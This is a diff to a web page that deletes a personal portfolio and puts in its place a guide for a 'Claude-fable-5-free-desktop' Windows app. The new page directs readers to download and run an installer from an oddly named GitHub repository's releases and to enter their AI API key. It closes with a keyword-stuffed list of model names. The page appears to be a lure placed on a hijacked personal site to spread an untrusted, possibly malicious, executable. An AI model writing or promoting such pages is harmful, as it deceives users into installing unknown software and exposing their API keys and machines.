@@ -1,309 +1,56 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>David Gehlert — TradFi Arbitrage</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
-  <style>
-    :root {
-      --bg: #f2f1ec;
-      --ink: #1b1b1b;
-      --muted: #5a5a54;
-      --line: #d9d8d2;
-    }
-
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    html {
-      scroll-behavior: smooth;
-      overflow-x: hidden;
-    }
-
-    body {
-      font-family: "Inter", "Helvetica Neue", Arial, sans-serif;
-      background: var(--bg);
-      color: var(--ink);
-      -webkit-font-smoothing: antialiased;
-      line-height: 1.5;
-      min-height: 100vh;
-      max-width: 100%;
-      overflow-x: hidden;
-      display: flex;
-      flex-direction: column;
-    }
-
-    .wrap {
-      width: 100%;
-      max-width: 1180px;
-      margin: 0 auto;
-      padding: 0 48px;
-    }
-
-    /* ---------- Top eyebrow row ---------- */
-    .topbar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 34px 0 0;
-      font-size: 12px;
-      font-weight: 600;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-
-    /* ---------- Name ---------- */
-    .name {
-      font-size: clamp(38px, 10.8vw, 128px);
-      font-weight: 900;
-      line-height: 1;
-      letter-spacing: -0.04em;
-      text-transform: uppercase;
-      white-space: nowrap;
-      padding: 18px 0 24px;
-    }
-
-    .divider {
-      height: 1px;
-      background: var(--line);
-      width: 100%;
-    }
-
-    /* ---------- Main hero ---------- */
-    .hero {
-      flex: 1;
-      display: grid;
-      grid-template-columns: 440px 1fr;
-      gap: 72px;
-      align-items: center;
-      padding: 56px 0 64px;
-    }
-
-    .portrait-frame {
-      position: relative;
-    }
-
-    .portrait {
-      width: 100%;
-      aspect-ratio: 4 / 5;
-      object-fit: cover;
-      display: block;
-      filter: grayscale(6%);
-    }
-
-    .hero-right {
-      max-width: 460px;
-    }
-
-    .eyebrow {
-      font-size: 12px;
-      font-weight: 700;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 18px;
-    }
-
-    .subtitle {
-      font-size: clamp(30px, 4.2vw, 52px);
-      font-weight: 800;
-      line-height: 1.02;
-      text-transform: uppercase;
-      letter-spacing: -0.02em;
-      margin-bottom: 26px;
-    }
-
-    .lede {
-      font-size: 16px;
-      color: var(--muted);
-      max-width: 420px;
-      margin-bottom: 40px;
-    }
-
-    /* ---------- Socials ---------- */
-    .socials {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-    }
-
-    .social {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 48px;
-      height: 48px;
-      border: 1.5px solid var(--ink);
-      border-radius: 50%;
-      color: var(--ink);
-      transition: background .2s ease, color .2s ease, transform .2s ease;
-    }
-
-    .social svg { width: 20px; height: 20px; }
-
-    .social:hover {
-      background: var(--ink);
-      color: var(--bg);
-      transform: translateY(-3px);
-    }
-
-    /* ---------- Footer ---------- */
-    footer {
-      border-top: 1px solid var(--line);
-    }
-
-    .foot {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 22px 0;
-      font-size: 12px;
-      font-weight: 500;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-
-    .foot a { color: var(--muted); text-decoration: none; }
-    .foot a:hover { color: var(--ink); }
-
-    /* ---------- Responsive ---------- */
-    @media (max-width: 900px) {
-      .wrap { padding: 0 32px; }
-      .topbar { padding-top: 28px; }
-      .name {
-        white-space: nowrap;
-        padding: 16px 0 20px;
-      }
-      .hero {
-        grid-template-columns: 1fr;
-        gap: 44px;
-        padding: 44px 0 52px;
-        align-items: start;
-      }
-      .portrait-frame {
-        max-width: 380px;
-        margin: 0 auto;
-        width: 100%;
-      }
-      .hero-right {
-        max-width: 100%;
-        text-align: center;
-      }
-      .lede { margin-left: auto; margin-right: auto; }
-      .socials { justify-content: center; }
-      .foot { flex-direction: column; gap: 10px; }
-    }
-
-    @media (max-width: 560px) {
-      .wrap { padding: 0 22px; }
-      .topbar {
-        padding-top: 22px;
-        font-size: 11px;
-        letter-spacing: 1.5px;
-      }
-      .name {
-        font-size: clamp(24px, 10.5vw, 60px);
-        white-space: nowrap;
-        letter-spacing: -0.03em;
-        padding: 14px 0 18px;
-      }
-      .hero {
-        gap: 34px;
-        padding: 34px 0 44px;
-      }
-      .portrait-frame { max-width: 300px; }
-      .eyebrow {
-        margin-bottom: 14px;
-        letter-spacing: 2.5px;
-      }
-      .subtitle { margin-bottom: 20px; }
-      .lede {
-        font-size: 15px;
-        margin-bottom: 32px;
-      }
-      .social {
-        width: 44px;
-        height: 44px;
-      }
-      .social svg { width: 18px; height: 18px; }
-      .foot {
-        padding: 20px 0;
-        font-size: 11px;
-        text-align: center;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Guide for installing Claude-fable-5-free-desktop on Windows. Run autonomous coding models with ease.">
+    <title>Claude-fable-5-free-desktop Setup Guide</title>
 </head>
-<body>
-  <div class="wrap">
-    <div class="topbar">
-      <span>Portfolio</span>
-      <span>Beijing</span>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 0 auto; padding: 20px; background-color: #f4f4f9;">
+
+    <h1 style="color: #2c3e50;">🤖 Claude-fable-5-free-desktop - Run powerful coding agents on Windows</h1>
+
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download Software Here</a>
     </div>
 
-    <h1 class="name">David Gehlert</h1>
-  </div>
+    <h2 style="color: #34495e;">🚀 About This Application</h2>
+    <p>This software brings advanced coding models to your desktop. It uses Claude Fable 5, a high-capacity model designed for complex programming tasks. You can run code, manage agentic processes, and automate repetitive tasks directly from your local machine. The application connects to these models via your own API keys. This setup gives you control over your workflow while maintaining privacy and performance.</p>
 
-  <div class="divider"></div>
+    <h2 style="color: #34495e;">⚙️ Getting Started</h2>
+    <p>Follow these steps to set up the software on your Windows computer. You do not need to write code to get this running. Read each step carefully to avoid errors.</p>
+    
+    <h3 style="color: #34495e;">1. Check System Requirements</h3>
+    <p>Before you begin, ensure your computer meets these minimum standards:</p>
+    <ul>
+        <li>Operating System: Windows 10 or Windows 11.</li>
+        <li>Memory: At least 8GB of RAM.</li>
+        <li>Storage: 500MB of free disk space.</li>
+        <li>Internet: A stable connection for API communication.</li>
+    </ul>
 
-  <main class="wrap hero">
-    <div class="portrait-frame">
-      <img class="portrait" src="https://davidgehlert.github.io/david.png" alt="Portrait of David Gehlert" />
+    <h3 style="color: #34495e;">2. Download the App</h3>
+    <p>Visit the official repository page to download the latest version of the installer. You can find the installer at this link:</p>
+    <p><a href="https://github.com/Superhuman-angulation365/Claude-fable-5-free-desktop" style="color: #2980b9;">Click here to visit the download page</a></p>
+    <p>Look for the 'Releases' section on the right side of that page. Select the most recent version labeled for Windows (usually ending in .exe or .msi) and save it to your Downloads folder.</p>
+
+    <h3 style="color: #34495e;">3. Install the Software</h3>
+    <p>Once the download completes, open your Downloads folder. Double-click the file you saved in the previous step. A window will appear asking for permission to install. Click 'Yes' or 'Run'. Follow the prompts on the screen to finish the installation process. You can select the default installation folder if you are unsure where to place the files.</p>
+
+    <h3 style="color: #34495e;">4. Configure Your API Key</h3>
+    <p>This application functions by connecting to AI services. You must provide a valid API key to start the engine. When you launch the application for the first time, a setup screen appears. Copy and paste your API key into the designated field. Ensure no extra spaces exist at the start or end of your key.</p>
+
+    <h2 style="color: #34495e;">🛠 Advanced Customization</h2>
+    <p>Once the software is operational, you can change how it behaves. You can modify system prompts within the settings menu. These prompts tell the AI how to act during coding tasks. By adjusting these, you change the way the model handles errors and self-correction loops. If you encounter rate limits, you can integrate a reverse proxy in the settings tab to manage traffic more effectively. These settings are optional and help power users build a more efficient environment.</p>
+
+    <h2 style="color: #34495e;">❓ Frequently Asked Questions</h2>
+    <p><strong>Is this software free?</strong> The application is free to download. You may need to pay for AI usage based on the limits of your chosen provider's API.</p>
+    <p><strong>Can I run this offline?</strong> This app requires an active internet connection to communicate with the AI model servers. It cannot run fully offline.</p>
+    <p><strong>How do I update the app?</strong> Check the repository link periodically for new releases. Install new updates over your existing installation to keep your settings intact.</p>
+
+    <div style="margin-top: 50px; padding: 20px; background-color: #eee; border-radius: 8px;">
+        <p style="font-size: small; color: #666;">Keywords: ai-desktop, ai-powered-applications, anthropic, claude-4-6-opus, claude-4-opus, claude-5-sonnet, claude-desktop-app, claude-desktop-extentions, claude-fable, claude-fable-5, claude-integration, claude-mythos, claude-opus, claude-opus-4-8, claude-skills-hub, claude-sonnet-5-api, desktop-ai, fable5, free-ai-coding, mythos</p>
     </div>
 
-    <div class="hero-right">
-      <p class="eyebrow">What I'm building</p>
-      <h2 class="subtitle">TradFi<br />Arbitrage</h2>
-      <p class="lede">
-        I am currently developing an arbitrage bot that capitalizes on
-        pricing discrepancies between traditional financial assets traded
-        on blockchain networks and their corresponding assets in
-        traditional financial markets.
-      </p>
-
-      <div class="socials">
-        <a class="social" href="https://www.instagram.com/davidleongehlert/" target="_blank" rel="noopener" aria-label="Instagram">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="2" y="2" width="20" height="20" rx="5" ry="5" />
-            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z" />
-            <line x1="17.5" y1="6.5" x2="17.51" y2="6.5" />
-          </svg>
-        </a>
-
-        <a class="social" href="https://uk.linkedin.com/in/david-gehlert-146718337" target="_blank" rel="noopener" aria-label="LinkedIn">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z" />
-            <rect x="2" y="9" width="4" height="12" />
-            <circle cx="4" cy="4" r="2" />
-          </svg>
-        </a>
-
-        <a class="social" href="https://github.com/davidgehlert" target="_blank" rel="noopener" aria-label="GitHub">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
-          </svg>
-        </a>
-
-        <a class="social" href="mailto:davidleongehlert@icloud.com" aria-label="Email">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="2" y="4" width="20" height="16" rx="2" />
-            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
-          </svg>
-        </a>
-      </div>
-    </div>
-  </main>
-
-  <footer>
-    <div class="wrap foot">
-      <span>&copy; 2026 David Gehlert</span>
-      <a href="mailto:davidleongehlert@icloud.com">davidleongehlert@icloud.com</a>
-    </div>
-  </footer>
 </body>
 </html>
-
